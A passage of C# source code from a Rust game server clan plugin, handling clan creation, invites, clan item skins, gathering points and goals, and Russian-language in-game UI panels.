gs)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan != null)
            {
                PrintChat(player, string.Format(msg("youalreadymember", current.Id)));
                return;
            }
            if (usePermToCreateClan && !permission.UserHasPermission(current.Id, permissionToCreateClan))
            {
                PrintChat(player, msg("nopermtocreate", current.Id));
                return;
            }
            if (args.Length < 2)
            {
                PrintChat(player, string.Format(msg("usagecreate", current.Id), colorCmdUsage));
                return;
            }
            if (tagReExt.IsMatch(args[1]))
            {
                PrintChat(player, string.Format(msg("hintchars", current.Id), allowedSpecialChars));
                return;
            }
            if (args[1].Length < tagLengthMin || args[1].Length > tagLengthMax)
            {
                PrintChat(player, string.Format(msg("hintlength", current.Id), tagLengthMin, tagLengthMax));
                return;
            }
            if (args.Length > 2)
            {
                args[2] = args[2].Trim();
                if (args[2].Length < 2 || args[2].Length > 30)
                {
                    PrintChat(player, string.Format(msg("providedesc", current.Id)));
                    return;
                }
            }
            if (enableWordFilter && FilterText(args[1]))
            {
                PrintChat(player, string.Format(msg("bannedwords", current.Id)));
                return;
            }
            string[] clanKeys = clans.Keys.ToArray();
            clanKeys = clanKeys.Select(c => c.ToLower()).ToArray();
            if (clanKeys.Contains(args[1].ToLower()))
            {
                PrintChat(player, string.Format(msg("tagblocked", current.Id)));
                return;
            }
            myClan = Clan.Create(args[1], args.Length > 2 ? args[2] : string.Empty, current.Id, current.Name, "https://www.guilded.gg/asset/GameIcons/Rust-lg.png");
            clans.Add(myClan.tag, myClan);
            clanCache[current.Id] = myClan;

            SetupPlayer(player, current, clan: myClan);
            myClan.AddBasePlayer(player);

            if (usePermGroups && !permission.GroupExists(permGroupPrefix + myClan.tag)) permission.CreateGroup(permGroupPrefix + myClan.tag, "Clan " + myClan.tag, 0);
            if (usePermGroups && !permission.UserHasGroup(current.Id, permGroupPrefix + myClan.tag)) permission.AddUserGroup(current.Id, permGroupPrefix + myClan.tag);
            myClan.OnCreate();
            myClan.total++;
            PrintChat(player, string.Format(msg("nownewowner", current.Id), myClan.tag, myClan.description) + "\n" + string.Format(msg("inviteplayers", current.Id), colorCmdUsage));
            return;
        }
        public void InvitePlayer(BasePlayer player, string targetId) => cmdClanInvite(player, new string[] {
            "", targetId
        }
        );




        void cmdClanInvite(BasePlayer player, string[] args)
        {
            var current = this.covalence.Players.FindPlayerById(player.UserIDString);
            var myClan = findClanByUser(current.Id);
            if (myClan == null)
            {
                PrintChat(player, string.Format(msg("notmember", current.Id)));
                return;
            }
            if (args.Length < 2)
            {
                PrintChat(player, string.Format(msg("usageinvite", current.Id), colorCmdUsage));
                return;
            }
            if (!myClan.IsOwner(current.Id) && !myClan.IsCouncil(current.Id) && !myClan.IsModerator(current.Id))
            {
                PrintChat(player, string.Format(msg("notmoderator", current.Id)));
                return;
            }
            var invPlayer = myClan.GetIPlayer(args[1]);
            if (invPlayer == null)
            {
                PrintChat(player, string.Format(msg("nosuchplayer", current.Id), args[1]));
                return;
            }
            if (myClan.members.ContainsKey(invPlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadymember", current.Id), invPlayer.Name));
                return;
            }
            if (myClan.invites.ContainsKey(invPlayer.Id))
            {
                PrintChat(player, string.Format(msg("alreadyinvited", current.Id), invPlayer.Name));
                return;
            }
            if (findClanByUser(invPlayer.Id) != null)
            {
                PrintChat(player, string.Format(msg("alreadyinclan", current.Id), invPlayer.Name));
                return;
            }
            if (usePermToJoinClan && !permission.UserHasPermission(invPlayer.Id, permissionToJoinClan))
            {
                PrintChat(player, string.Format(msg("nopermtojoinbyinvite", current.Id), invPlayer.Name));
                return;
            }
            myClan.invites.Add(invPlayer.Id, UnixTimeStampUTC());
            if (!pendingPlayerInvites.ContainsKey(invPlayer.Id)) pendingPlayerInvites.Add(invPlayer.Id, new List<string>());
            pendingPlayerInvites[invPlayer.Id].Add(myClan.tag);
            myClan.BroadcastLoc("invitebroadcast", myClan.ColNam(current.Id, current.Name), myClan.ColNam(invPlayer.Id, invPlayer.Name));
            if (invPlayer.IsConnected)
            {
                var invited = rust.FindPlayerByIdString(invPlayer.Id);
                if (invited != null) PrintChat(invited, string.Format(msg("claninvite", invPlayer.Id), myClan.tag, myClan.description, colorCmdUsage));
            }
            myClan.updated = UnixTimeStampUTC();
        }

        string ButtonListed = "[{\"name\":\"clans_player{id}\",\"parent\":\"clans_main7\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"{color}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.001 {amin}\",\"anchormax\":\"0.998 {amax}\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"clans_player{id}\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"\",\"fontSize\":16,\"font\":\"robotocondensed-bold.ttf\",\"align\":\"MiddleCenter\"},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.2784314\",\"distance\":\"1 -1\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]},{\"name\":\"CuiElement\",\"parent\":\"clans_player{id}\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"{command}\",\"color\":\"1 1 1 0\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"1 1\"}]}]";

        private string GetImageUrl(string shortname, ulong skinid) =>
           ImageLibrary.CallHook("GetImageURL", shortname, skinid) as string;

        private void AddLoadOrder(IDictionary<string, string> imageList, bool replace = false) =>
           ImageLibrary?.Call("ImportImageList", Title, imageList, (ulong)ResourceId, replace);

        private string GetImage(string shortname, ulong skinid = 13975490) =>
           ImageLibrary.CallHook("GetImage", $"{shortname} {skinid}") as string;

        bool? CanWearItem(PlayerInventory inventory, Item item, int targetPos)
        {
            if (inventory == null || item == null) return null;
            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;
            if (player == null) return null;
            var clan = findClanByUser(player.UserIDString);
            if (clan != null && item.skin == 0)
                if (clan.SkinList["wear"].ContainsKey(item.info.shortname))
                    item.skin = clan.SkinList["wear"][item.info.shortname];
            return null;
        }

        private bool? CanEquipItem(PlayerInventory inventory, Item item, int targetPos)
        {
            if (inventory == null || item == null) return null;
            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;
            if (player == null) return null;
            var clan = findClanByUser(player.UserIDString);
            if (clan != null)
            {
                if (clan.SkinList["weapon"].ContainsKey(item.info.shortname) && item.skin != clan.SkinList["weapon"][item.info.shortname] && item.skin == 0)
                {
                    item.skin = clan.SkinList["weapon"][item.info.shortname];
                    item.MarkDirty();
                    if (item.GetHeldEntity() != null)
                    {
                        item.GetHeldEntity().skinID = clan.SkinList["weapon"][item.info.shortname];
                        item.GetHeldEntity().SendNetworkUpdate();
                    }
                }
            }
            return null;
        }

        private void OnActiveItemChanged(BasePlayer player, Item oldItem, Item item)
        {
            if (player == null || item == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan != null)
            {
                if (clan.SkinList["weapon"].ContainsKey(item.info.shortname) && item.skin != clan.SkinList["weapon"][item.info.shortname] && item.skin == 0)
                {
                    item.skin = clan.SkinList["weapon"][item.info.shortname];
                    item.MarkDirty();
                    if (item.GetHeldEntity() != null)
                    {
                        item.GetHeldEntity().skinID = clan.SkinList["weapon"][item.info.shortname];
                        item.GetHeldEntity().SendNetworkUpdate();
                    }
                }
            }
        }

        static readonly DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);

        static double CurrentTime() => DateTime.UtcNow.Subtract(epoch).TotalSeconds;

        private double IsBlocked()
        {
            return 1;
            var lefTime = SaveRestore.SaveCreatedTime.ToUniversalTime().Subtract(epoch).TotalSeconds + 86400 - CurrentTime();
            return lefTime > 0 ? lefTime : 0;
        }

        private void SmeltOre(BasePlayer player, Item item, bool bonus)
        {
            if (IsBlocked() == 0) return;
            string shortname = "";
            switch (item.info.shortname)
            {
                case "stones":
                    shortname = "stones";
                    break;
                case "metal.fragments":
                    shortname = "metal.ore";
                    break;
                case "sulfur":
                    shortname = "sulfur.ore";
                    break;
                case "metal.refined":
                    shortname = "hq.metal.ore";
                    break;
            }
            var clan = findClanByUser(player.UserIDString);
            if (clan != null && clan.members[player.UserIDString].GatherInfo.ContainsKey(shortname))
            {
                if (clan.Change.ContainsKey(shortname) && clan.Change[shortname].Complete < clan.Change[shortname].Need)
                {
                    clan.Change[shortname].Complete = clan.Change[shortname].Complete + item.amount;
                    clan.members[player.UserIDString].GatherInfo[shortname] = clan.members[player.UserIDString].GatherInfo[shortname] + item.amount;
                    if (clan.Change[shortname].Complete > clan.Change[shortname].Need)
                        clan.Change[shortname].Complete = clan.Change[shortname].Need;
                }
                clan.members[player.UserIDString].GatherInfo[item.info.shortname] += item.amount;
            }

            if (bonus)
            {
                clan.members[player.UserIDString].GatherInfo[item.info.shortname] += item.amount;
                switch (shortname)
                {
                    case "stones":
                        clan.members[player.UserIDString].PlayerPoints += PointsOfGatherStone;
                        clan.ClanPoints += PointsOfGatherStone;
                        break;
                    case "wood":
                        clan.members[player.UserIDString].PlayerPoints += PointsOfGatherWood;
                        clan.ClanPoints += PointsOfGatherWood;
                        break;
                    case "metal.ore":
                        clan.members[player.UserIDString].PlayerPoints += PointsOfGatherMetalOre;
                        clan.ClanPoints += PointsOfGatherMetalOre;
                        break;
                    case "sulfur.ore":
                        clan.members[player.UserIDString].PlayerPoints += PointsOfGatherSulfur;
                        clan.ClanPoints += PointsOfGatherSulfur;
                        break;
                    case "hq.metal.ore":
                        clan.members[player.UserIDString].PlayerPoints += PointsOfGatherHQM;
                        clan.ClanPoints += PointsOfGatherHQM;
                        break;
                }
            }
        }


        void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {
            if (IsBlocked() == 0) return;
            if (!entity.ToPlayer() || entity == null || item == null) return;

            var player = entity.ToPlayer();
            if (player == null || player.IsNpc) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan != null && clan.members.ContainsKey(player.UserIDString) && clan.members[player.UserIDString].GatherInfo.ContainsKey(item.info.shortname))
                if (clan.Change.ContainsKey(item.info.shortname) && clan.Change[item.info.shortname].Complete < clan.Change[item.info.shortname].Need)
                {
                    NextTick(() =>
                    {
                        if (player == null || clan == null || item == null) return;
                        if (!clan.members.ContainsKey(player.UserIDString)) return;
                        clan.Change[item.info.shortname].Complete = clan.Change[item.info.shortname].Complete + item.amount;
                        clan.members[player.UserIDString].GatherInfo[item.info.shortname] = clan.members[player.UserIDString].GatherInfo[item.info.shortname] + item.amount;
                        if (clan.Change[item.info.shortname].Complete > clan.Change[item.info.shortname].Need)
                            clan.Change[item.info.shortname].Complete = clan.Change[item.info.shortname].Need;

                    });

                }
        }

        void OnDispenserBonus(ResourceDispenser disp, BasePlayer player, Item item)
        {
            if (IsBlocked() == 0) return;
            if (player == null) return;
            if (player == null || player.IsNpc) return;

            var clan = findClanByUser(player.UserIDString);
            if (clan != null && clan.members[player.UserIDString].GatherInfo.ContainsKey(item.info.shortname))
            {
                NextTick(() =>
                {
                    if (player == null || clan == null || item == null) return;
                    if (!clan.members.ContainsKey(player.UserIDString)) return;
                    if (clan.Change.ContainsKey(item.info.shortname) && clan.Change[item.info.shortname].Complete < clan.Change[item.info.shortname].Need)
                    {
                        clan.Change[item.info.shortname].Complete = clan.Change[item.info.shortname].Complete + item.amount;
                        clan.members[player.UserIDString].GatherInfo[item.info.shortname] = clan.members[player.UserIDString].GatherInfo[item.info.shortname] + item.amount;
                        if (clan.Change[item.info.shortname].Complete > clan.Change[item.info.shortname].Need)
                            clan.Change[item.info.shortname].Complete = clan.Change[item.info.shortname].Need;
                    }


                    if (RewardGather.ContainsKey(item.info.shortname))
                    {
                        clan.members[player.UserIDString].PlayerPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                        clan.ClanPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                    }
                });
            }

        }

        [ConsoleCommand("clans_getskinIds")]
        void cmdClansGetSkinList(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            var SkinList = GetImageSkins(args.Args[0]);
            var elements = new CuiElementContainer();
            elements.Add(new CuiElement
            {
                Name = "clans_skinlist1",
                Parent = MainLayer,
                Components =
                    {
                        new CuiButtonComponent {Color = "0 0 0 0.98" , Sprite = "assets/content/ui/ui.background.tile.psd" , Command = $"UI_CLAN close clans_skinlist1 UICLAN_edit"},
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
            });

            elements.Add(new CuiElement
            {
                Name = "clans_skinlist",
                Parent = "clans_skinlist1",
                Components =
                    {
                        new CuiImageComponent {Color = "0 0 0 0"},
                        new CuiRectTransformComponent {AnchorMin = "0.1 0.1", AnchorMax = "0.9 0.8"}
                    }
            });

            elements.Add(new CuiElement
            {
                Parent = "clans_skinlist1",
                Components =
                    {
                        new CuiTextComponent { Text = "<size=25>ВЫБЕРИТЕ НУЖНЫЙ СКИН ПРОСТО НАЖАВ НА НЕГО</size>", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf"},
                        new CuiRectTransformComponent { AnchorMin = "0 0.8", AnchorMax = "1 1" },
                    }
            });

            var poses = GetPositions(9, 5, 0.01f, 0.01f);
            if (SkinList.Count > 45) SkinList.Take(45);
            var count = SkinList.Count < 45 ? SkinList.Count : 45;
            for (int i = 0; i < count; i++)
            {
                elements.Add(new CuiElement
                {
                    Name = "clans_skinlist" + SkinList[i],
                    Parent = "clans_skinlist",
                    Components =
                    {
                        new CuiImageComponent {FadeIn = 0.5f, Color = "0.3294118 0.3294118 0.3294118 0.5"},
                        new CuiRectTransformComponent {AnchorMin = poses[i].AnchorMin, AnchorMax = poses[i].AnchorMax}
                    }
                });

                elements.Add(new CuiElement
                {
                    Parent = "clans_skinlist" + SkinList[i],
                    Components =
                    {
                        new CuiRawImageComponent {FadeIn = 0.5f , Png = GetImageSkin(args.Args[0], SkinList[i])},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
                });
                elements.Add(new CuiButton
                {
                    Button = { Color = "0.13 0.44 0.48 0", Command = $"clan_changeskin {args.Args[0]} {SkinList[i]}" },
                    Text = { Text = "", Color = "1 0.9294118 0.8666667 1", FontSize = 14, Align = TextAnchor.MiddleCenter },
                    RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" },
                }, "clans_skinlist" + SkinList[i]);
            }

            elements.Add(new CuiElement
            {
                Name = "clans_skinlist_input",
                Parent = "clans_skinlist",
                Components =
                    {
                        new CuiImageComponent {Color = "1 1 1 0.2"},
                        new CuiRectTransformComponent {AnchorMin = "0 -0.1", AnchorMax = "1 0"}
                    }
            });


            elements.Add(new CuiElement
            {
                Parent = "clans_skinlist_input",
                Components =
                    {
                        new CuiTextComponent { Text = "<size=24>ТАК ЖЕ ВЫ МОЖЕТЕ СЮДА ВВЕСТИ ID СВОЕГО СКИНА</size>", Color = "1 0.9294118 0.8666667 0.05", Font = "robotocondensed-regular.ttf", Align = TextAnchor.MiddleCenter},
                        new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" },
                    }
            });

            elements.Add(new CuiElement()
            {
                Parent = "clans_skinlist_input",
                Components =
                {
                    new CuiInputFieldComponent
                    {
                        Align = TextAnchor.MiddleCenter,
                        CharsLimit = 64,
                        FontSize = 26,
                        Command = $"clan_changeskin {args.Args[0]} ",Font = "robotocondensed-regular.ttf",
                        Text = "",
                        Color = "1 1 1 1"
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "0 0", AnchorMax = "1 1"
                    }
                }
            });


            CuiHelper.AddUi(player, elements);
        }

        [ConsoleCommand("clan_setChange")]
        void cmdSetChangeOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            if (player == null) return;
            CuiHelper.DestroyUi(player, "clan_setChange");

            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;
            var elements = new CuiElementContainer();
            elements.Add(new CuiElement
            {
                Name = "clan_setChange",
                Parent = MainLayer,
                Components =
                    {
                        new CuiRawImageComponent {Color = "0 0 0 0.95", Sprite = "assets/content/ui/ui.background.tile.psd"},
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
            });


            elements.Add(new CuiElement
            {
                Parent = "clan_setChange",
                Components =
                    {
                        new CuiButtonComponent {Color = "0 0 0 0", Command = $"UI_CLAN close clan_setChange UICLAN_edit"},
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
            });


            elements.Add(new CuiElement
            {
                Parent = "clan_setChange",
                Components =
                    {
                        new CuiTextComponent { Text = "<size=25>ВВЕДИТЕ НУЖНЫЕ ЗНАЧЕНИЯ В ПОЛЯ, ДЛЯ СОХРАНЕНИЯ НАЖМИТЕ ОК</size>", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf"},
                        new CuiRectTransformComponent { AnchorMin = "0 0.8", AnchorMax = "1 1" },
                    }
            });


            elements.Add(new CuiElement
            {
                Name = "clan_setChange1",
                Parent = "clan_setChange",
                Components =
                    {
                        new CuiRawImageComponent {Color = "1 1 1 0"},
                        new CuiRectTransformComponent {AnchorMin = "0.2 0.2", AnchorMax = "0.8 0.8"}
                    }
            });

            var poses = GetPositions(2, clan.Change.Count / 2, 0.01f, 0.03f);

            for (int i = 0; i < clan.Change.Count; i++)
            {
                elements.Add(new CuiElement
                {
                    Name = $"clans_setChange_main{i}",
                    Parent = "clan_setChange1",
                    Components =
                    {
                        new CuiImageComponent {Color = "0.3294118 0.3294118 0.3294118 0.1"},
                        new CuiRectTransformComponent {AnchorMin = poses[i].AnchorMin, AnchorMax = poses[i].AnchorMax}
                    }
                });

                elements.Add(new CuiElement
                {
                    Parent = $"clans_setChange_main{i}",
                    Components =
                    {
                        new CuiRawImageComponent {Color = "1 1 1 1", Png = (string)ImageLibrary.Call("GetImage", clan.Change.ToList()[i].Key)},
                        new CuiRectTransformComponent {AnchorMin = "0.05 0", AnchorMax = "0.2 1"}
                    }
                });
                elements.Add(new CuiElement
                {
                    Parent = $"clans_setChange_main{i}",
                    Components =
                    {
                        new CuiTextComponent { Text = $"Установлено:\n{clan.Change.ToList()[i].Value.Need.ToString("N3", CultureInfo.GetCultureInfo("ru-RU")).Replace(",000", "")}".ToUpper(), Color = "1 0.9294118 0.8666667 1", Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter},
                        new CuiRectTransformComponent { AnchorMin = "0.3 0", AnchorMax = "0.6 1" },
                    }
                });

                elements.Add(new CuiElement
                {
                    Name = $"clans_setChange_main1{i}",
                    Parent = $"clans_setChange_main{i}",
                    Components =
                    {
                        new CuiImageComponent {Color = "0.3294118 0.3294118 0.3294118 0.5"},
                        new CuiRectTransformComponent { AnchorMin = "0.65 0.15", AnchorMax = "0.9 0.85"}
                    }
                });

                elements.Add(new CuiElement()
                {
                    Parent = $"clans_setChange_main1{i}",
                    Components =
                    {
                        new CuiInputFieldComponent {Align = TextAnchor.MiddleCenter,CharsLimit = 7,FontSize = 15,
                            Command = $"clan_Change {clan.Change.ToList()[i].Key} ",Font = "robotocondensed-bold.ttf",Text = "", Color = "1 0.9294118 0.8666667 1"},
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
                });


                elements.Add(new CuiButton
                {
                    Button = { Color = "0.59 0.83 0.60 1.00", Command = $"" },
                    Text = { Text = "OK", Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "robotocondensed-bold.ttf", Color = "1 0.9294118 0.8666667 1" },
                    RectTransform = { AnchorMin = $"0.9 0.15", AnchorMax = $"0.997 0.85" },
                }, $"clans_setChange_main{i}");
            }

            elements.Add(new CuiButton
            {
                Button = { Color = "0.59 0.83 0.60 1.00", Command = "UI_CLAN close clan_setChange UICLAN_edit" },
                Text = { Text = "ЗАВЕРШИТЬ", Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "robotocondensed-bold.ttf", Color = "1 0.9294118 0.8666667 1" },
                RectTransform = { AnchorMin = $"0.4 0.03", AnchorMax = $"0.6 0.09" },
            }, $"clan_setChange");
            CuiHelper.AddUi(player, elements);
        }

        [ConsoleCommand("clan_Change")]
        void cmdSetNewChangeOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();

            if (args.GetString(1) == "") return;

            int amount;
            if (!int.TryParse(args.Args[1], out amount)) return;

            var clan = findClanByUser(player.UserIDString);

            if (clan.Change.ContainsKey(args.Args[0]))
            {
                clan.Change[args.Args[0]].Need = amount;
            }


            cmdSetChangeOfClan(args);
        }

        class Position
        {
            public float Xmin;
            public float Xmax;
            public float Ymin;
            public float Ymax;

            public string AnchorMin =>
                $"{Math.Round(Xmin, 4).ToString(CultureInfo.InvariantCulture)} {Math.Round(Ymin, 4).ToString(CultureInfo.InvariantCulture)}";
            public string AnchorMax =>
                $"{Math.Round(Xmax, 4).ToString(CultureInfo.InvariantCulture)} {Math.Round(Ymax, 4).ToString(CultureInfo.InvariantCulture)}";

            public override string ToString()
            {
                return $"----------\nAmin:{AnchorMin}\nAmax:{AnchorMax}\n----------";
            }
        }

        [SuppressMessage("ReSharper", "CompareOfFloatsByEqualityOperator")]
        private static List<Position> GetPositions(int colums, int rows, float colPadding = 0, float rowPadding = 0, bool columsFirst = false)
        {
            if (colums == 0)
                throw new ArgumentException("Can't create positions for gui!", nameof(colums));
            if (rows == 0)
                throw new ArgumentException("Can't create positions for gui!", nameof(rows));

            List<Position> result = new List<Position>();
            result.Clear();
            var colsDiv = 1f / colums;
            var rowsDiv = 1f / rows;
            if (colPadding == 0) colPadding = colsDiv / 2;
            if (rowPadding == 0) rowPadding = rowsDiv / 2;
            if (!columsFirst)
                for (int j = rows; j >= 1; j--)
                {
                    for (int i = 1; i <= colums; i++)
                    {
                        Position pos = new Position
                        {
                            Xmin = (i - 1) * colsDiv + colPadding / 2f,
                            Xmax = i * colsDiv - colPadding / 2f,
                            Ymin = (j - 1) * rowsDiv + rowPadding / 2f,
                            Ymax = j * rowsDiv - rowPadding / 2f
                        };
                        result.Add(pos);
                    }
                }
            else
                for (int i = 1; i <= colums; i++)
                {
                    for (int j = rows; j >= 1; j--)
                    {
                        Position pos = new Position
                        {
                            Xmin = (i - 1) * colsDiv + colPadding / 2f,
                            Xmax = i * colsDiv - colPadding / 2f,
                            Ymin = (j - 1) * rowsDiv + rowPadding / 2f,
                            Ymax = j * rowsDiv - rowPadding / 2f
                        };
                        result.Add(pos);
                    }
                }
            return result;
        }
        [ConsoleCommand("clan_changeskin")]
        void cmdChatSkinOfClan(ConsoleSystem.Arg args)
        {
            if (args.GetString(1) == "") return;
            var player = args.Player();
            if (player == null) return;
            var clan = findClanByUser(player.UserIDString);
            if (clan == null) return;

            ulong SkinID;
            if (!ulong.TryParse(args.Args[1], out SkinID)) return;
            if (string.IsNullOrEmpty(GetImageUrl(args.Args[0], SkinID)))
                ImageLibrary?.Call("AddImage", GetImageUrl(args.Args[0], SkinID), args.Args[0], SkinID);
            var value = clan.SkinList.FirstOrDefault(p => p.Value.ContainsKey(args.Args[0])).Key;
            clan.SkinList[value][args.Args[0]] = SkinID;
            NewClanUI(player);
        }

        [ConsoleCommand("clan_kickplayer")]
        void cmdKickOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            KickPlayer(player, args.Args[0]);
            NewClanUI(player);
        }


        public List<uint> IgnoreList = new List<uint>();

        void OnItemDropped(Item item, BaseEntity entity)
        {
            if (item == null) return;
            
            if (!IgnoreList.Contains(item.uid))
                IgnoreList.Add(item.uid);
        }

        // void OnItemAddedToContainer(ItemContainer container, Item item)
        // {
            // if (IsBlocked() == 0) return;

            // if (container.playerOwner == null || container.playerOwner.IsNpc) return;
            // if (item.info.category != ItemCategory.Component && !item.info.shortname.Contains("scrap")) return;

            // var player = container.playerOwner;
            // if (player == null) return;
            // if (player.inventory.loot != null && player.inventory.loot.entitySource != null && player.inventory.loot.entitySource.OwnerID != 0)
                // return;

            // var playerClan = findClanByUser(container.playerOwner.UserIDString);
            // if (playerClan == null) return;
            // if (!HasSeenPlayer(container.playerOwner.userID, item) && playerClan.members[container.playerOwner.UserIDString].GatherInfo.ContainsKey(item.info.shortname))
            // {
                // var itemKey = playerClan.members[container.playerOwner.UserIDString].GatherInfo[item.info.shortname];

                // if (playerClan.Change.ContainsKey(item.info.shortname) && playerClan.Change[item.info.shortname].Complete < playerClan.Change[item.info.shortname].Need)
                // {
                    // playerClan.Change[item.info.shortname].Complete = playerClan.Change[item.info.shortname].Complete + item.amount;
                    // playerClan.members[player.UserIDString].GatherInfo[item.info.shortname] = playerClan.members[player.UserIDString].GatherInfo[item.info.shortname] + item.amount;
                    // if (playerClan.Change[item.info.shortname].Complete > playerClan.Change[item.info.shortname].Need)
                        // playerClan.Change[item.info.shortname].Complete = playerClan.Change[item.info.shortname].Need;
                // }
                // if (RewardGather.ContainsKey(item.info.shortname))
                // {
                    // playerClan.members[player.UserIDString].PlayerPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                    // playerClan.ClanPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                // }
                // SetSeenPlayer(container.playerOwner.userID, item);
            // }
        // }

        private void CopySeenPlayers(Item @from, Item to)
        {
            if (!_looters.ContainsKey(@from.uid))
            {
                _looters[@from.uid] = new HashSet<ulong>();
            }
            if (!_looters.ContainsKey(to.uid))
            {
                _looters[to.uid] = new HashSet<ulong>();
            }
            _looters[to.uid].UnionWith(_looters[@from.uid]);
        }

        void CanStackItem(Item stack, Item item)
        {
            if (IsBlocked() == 0) return;
            if (item == null) return;
            if (item.info.category != ItemCategory.Component && !item.info.shortname.Contains("scrap")) return;

            var playerOwner = stack.GetOwnerPlayer();
            if (!playerOwner || playerOwner.IsNpc) return;
            var playerClan = findClanByUser(playerOwner.UserIDString);
            if (playerClan == null) return;
            bool canStack = stack != item && item.info.stackable > 1 &&
                            (stack.info.stackable > 1 && stack.info.itemid == item.info.itemid) &&
                            ((!item.hasCondition || (double)item.condition == (double)item.maxCondition) &&
                             (!stack.hasCondition || (double)stack.condition == (double)stack.maxCondition)) &&
                            (item.IsValid() && (!item.IsBlueprint() || item.blueprintTarget == stack.blueprintTarget));
            if (!canStack)
                return;
            if (playerOwner.inventory.loot != null && playerOwner.inventory.loot.entitySource != null && playerOwner.inventory.loot.entitySource.OwnerID != 0)
                return;
            CopySeenPlayers(item, stack);
            if (!HasSeenPlayer(playerOwner.userID, item) && playerClan.members[playerOwner.UserIDString].GatherInfo.ContainsKey(item.info.shortname))
            {

                var itemKey = playerClan.members[playerOwner.UserIDString].GatherInfo[item.info.shortname];

                if (playerClan.Change.ContainsKey(item.info.shortname) && playerClan.Change[item.info.shortname].Complete < playerClan.Change[item.info.shortname].Need)
                {
                    playerClan.Change[item.info.shortname].Complete = playerClan.Change[item.info.shortname].Complete + item.amount;
                    playerClan.members[playerOwner.UserIDString].GatherInfo[item.info.shortname] = playerClan.members[playerOwner.UserIDString].GatherInfo[item.info.shortname] + item.amount;
                    if (playerClan.Change[item.info.shortname].Complete > playerClan.Change[item.info.shortname].Need)
                        playerClan.Change[item.info.shortname].Complete = playerClan.Change[item.info.shortname].Need;
                }
                if (RewardGather.ContainsKey(item.info.shortname))
                {
                    playerClan.members[playerOwner.UserIDString].PlayerPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                    playerClan.ClanPoints += int.Parse(RewardGather[item.info.shortname].ToString());
                }
                SetSeenPlayer(playerOwner.userID, item);
            }

            if (_looters.ContainsKey(item.uid))
                _looters.Remove(item.uid);
        }

        private void SetSeenPlayer(ulong ownerId, Item item)
        {
            if (!_looters.ContainsKey(item.uid))
            {
                _looters[item.uid] = new HashSet<ulong> { ownerId };
            }

            if (_looters[item.uid].Contains(ownerId)) return;
            _looters[item.uid].Add(ownerId);
        }

        private Dictionary<uint, HashSet<ulong>> _looters = new Dictionary<uint, HashSet<ulong>>();


        private bool HasSeenPlayer(ulong ownerId, Item item)
        {
            if (item == null) return false;
            return _looters.ContainsKey(item.uid) && _looters[item.uid].Contains(ownerId);
        }

        [ConsoleCommand("clan_setAvatar")]
        void cmdSetAvatarOfClan(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            CuiHelper.DestroyUi(player, "clans_setAvatar");

            var elements = new CuiElementContainer();
            elements.Add(new CuiElement
            {
                Name = "clans_setAvatar",
                Parent = MainLayer,
                Components =
                    {
                        new CuiRawImageComponent {Color = "0 0 0 0.85",Sprite = "assets/content/ui/ui.background.tile.psd", Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" },
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                    }
            });

            elements.Add(new CuiButton
            {
                Button = { Color = "0.13 0.44 0.48 0", Close = $"clans_setAvatar" },
                Text = { Text = "" },
                RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" },
            }, $"clans_setAvatar");

            elements.Add(new CuiElement
            {
                Parent = "clans_setAvatar",
                Components =
                    {
                        new CuiTextComponent { Text = "<size=25>НАСТРОЙКА АВАТАРА КЛАНА</size>\nУкажите прямую ссылку на аватар .png или .jpg. Скопируйте её заранее, и вставьте в окно ниже", Color = "1 1 1 1", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 14},
                        new CuiRectTransformComponent { AnchorMin = "0 0.7", AnchorMax = "1 1" },
                    }
            });

            elements.Add(new CuiElement
            {
                Name = "clans_setAvatar_input",
                Parent = "clans_setAvatar",
                Components =
                    {
